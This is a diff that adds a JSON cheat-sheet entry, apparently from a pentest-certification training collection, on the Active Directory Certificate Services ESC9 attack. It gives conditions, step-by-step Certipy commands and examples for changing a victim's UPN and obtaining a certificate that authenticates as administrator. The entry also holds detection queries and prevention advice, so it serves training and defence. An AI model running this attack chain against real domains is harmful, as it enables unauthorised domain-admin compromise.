@@ -1,0 +1,100 @@
+{
+  "id": "ad-adcs-esc9-no-security-extension",
+  "name": "ADCS ESC9 - No Security Extension (CT_FLAG_NO_SECURITY_EXTENSION)",
+  "command": "certipy req -u <user>@<domain> -p <pass> -ca <ca_name> -template <vuln_template> -dc-ip <dc_ip>",
+  "description": "ESC9 exploits the CT_FLAG_NO_SECURITY_EXTENSION flag (msPKI-Enrollment-Flag 0x80000) which prevents the szOID_NTDS_CA_SECURITY_EXT from being embedded in the certificate. This security extension maps the certificate to the requestor. Without it, combined with StrongCertificateBindingEnforcement=1 (not 2), you can request a certificate and use it to authenticate as another user by modifying the userPrincipalName first.",
+  "platform": "linux",
+  "type": "attack-chain",
+  "opsec": "moderate",
+  "category": "Active Directory",
+  "subcategory": "ADCS Abuse",
+  "certifications": [
+    "CRTP",
+    "CPTS"
+  ],
+  "primary_cert": "CRTP",
+  "source": "SpecterOps Certified Pre-Owned; Certipy documentation",
+  "tags": [
+    "adcs",
+    "esc9",
+    "no-security-extension",
+    "certificate-mapping",
+    "upn-abuse"
+  ],
+  "mitre": [
+    "T1649"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== CONDITIONS ===\n1. Template has CT_FLAG_NO_SECURITY_EXTENSION (0x80000) in msPKI-Enrollment-Flag\n2. Template allows client authentication (EKU)\n3. StrongCertificateBindingEnforcement is NOT 2 (default is 1)\n4. You have GenericWrite over another user to change their UPN\n\n=== ATTACK STEPS ===\n  # Step 1 - Change victim UPN to target (e.g., admin)\n  certipy account update -u <user>@<domain> -p <pass> -user <victim> -upn administrator\n  # Step 2 - Request cert as victim (cert will have admin UPN)\n  certipy req -u <victim>@<domain> -p <pass> -ca <ca_name> -template <vuln_template>\n  # Step 3 - Restore victim UPN\n  certipy account update -u <user>@<domain> -p <pass> -user <victim> -upn <victim>@<domain>\n  # Step 4 - Authenticate with cert (maps to admin due to UPN)\n  certipy auth -pfx administrator.pfx -dc-ip <dc_ip>\n\n=== WHY IT WORKS ===\nWithout the security extension, the DC maps the certificate to the\nuser by UPN only. If you changed the UPN before requesting the cert,\nthe cert maps to whoever had that UPN.",
+  "examples": [
+    {
+      "label": "Change victim UPN to administrator",
+      "command": "certipy account update -u jdoe@corp.local -p Password123 -user victim -upn administrator"
+    },
+    {
+      "label": "Request certificate as victim",
+      "command": "certipy req -u victim@corp.local -p Password123 -ca corp-CA -template VulnTemplate"
+    },
+    {
+      "label": "Authenticate with forged mapping",
+      "command": "certipy auth -pfx administrator.pfx -dc-ip 192.168.1.10"
+    }
+  ],
+  "references": [
+    {
+      "title": "SpecterOps - Certified Pre-Owned",
+      "url": "https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf"
+    },
+    {
+      "title": "Certipy ESC9 Documentation",
+      "url": "https://github.com/ly4k/Certipy#esc9"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "ad-esc1-certipy-linux",
+      "note": "ESC1 is a simpler ADCS attack; ESC9 targets the security extension.",
+      "rel": "alternative"
+    },
+    {
+      "id": "ad-esc15-ekuwu",
+      "note": "ESC15 also targets certificate mapping but via different flags.",
+      "rel": "alternative"
+    }
+  ],
+  "defense": {
+    "why_it_works": "CT_FLAG_NO_SECURITY_EXTENSION prevents the CA from embedding the requestor SID in the certificate. Without this binding, authentication relies solely on UPN matching, which can be manipulated.",
+    "prerequisites": "GenericWrite on another account; vulnerable template with CT_FLAG_NO_SECURITY_EXTENSION; StrongCertificateBindingEnforcement != 2.",
+    "impact": "Domain admin compromise by impersonating any user via certificate-based authentication.",
+    "detection": "[MITRE T1649] UPN changes followed by certificate requests; Event 4738 (account modification) correlated with 4886/4887 (cert request/issue).",
+    "artifacts": "Event 4738 showing UPN change; Event 4886/4887 for certificate enrollment; Event 4768 with PKINIT.",
+    "splunk_spl": "index=windows (EventCode=4738 AND UserPrincipalName=\"administrator*\") OR (EventCode=4886)\n| transaction SubjectUserName maxspan=10m\n| where eventcount > 1",
+    "elastic_kql": "event.code:\"4738\" AND winlog.event_data.UserPrincipalName:*",
+    "sentinel_kql": "SecurityEvent\n| where EventID == 4738\n| where TargetUserName != \"\" and UserPrincipalName != \"\"\n| project TimeGenerated, SubjectUserName, TargetUserName, UserPrincipalName",
+    "sigma_rules": "win_security_adcs_esc9_upn_change_cert_request",
+    "prevention": "Set StrongCertificateBindingEnforcement to 2; remove CT_FLAG_NO_SECURITY_EXTENSION from templates; monitor UPN changes.",
+    "sources": [
+      "SpecterOps research",
+      "https://attack.mitre.org/techniques/T1649/"
+    ],
+    "detections": [
+      {
+        "platform": "sentinel",
+        "name": "ESC9 - UPN change followed by certificate request",
+        "logic": "let upn_changes = SecurityEvent\n| where EventID == 4738\n| where UserPrincipalName != \"\"\n| project ChangeTime=TimeGenerated, ChangedBy=SubjectUserName, TargetAccount=TargetUserName, NewUPN=UserPrincipalName;\nlet cert_requests = SecurityEvent\n| where EventID == 4886\n| project RequestTime=TimeGenerated, Requester=SubjectUserName;\nupn_changes\n| join kind=inner (cert_requests) on $left.TargetAccount == $right.Requester\n| where RequestTime between (ChangeTime .. (ChangeTime + 10m))",
+        "data_source": "windows-security",
+        "log_ids": [
+          "4738",
+          "4886"
+        ],
+        "attack": [
+          "T1649"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "high",
+        "false_positives": "Legitimate UPN changes during account migrations",
+        "tuning": "Narrow time window; alert on any UPN change to privileged account names"
+      }
+    ]
+  }
+}
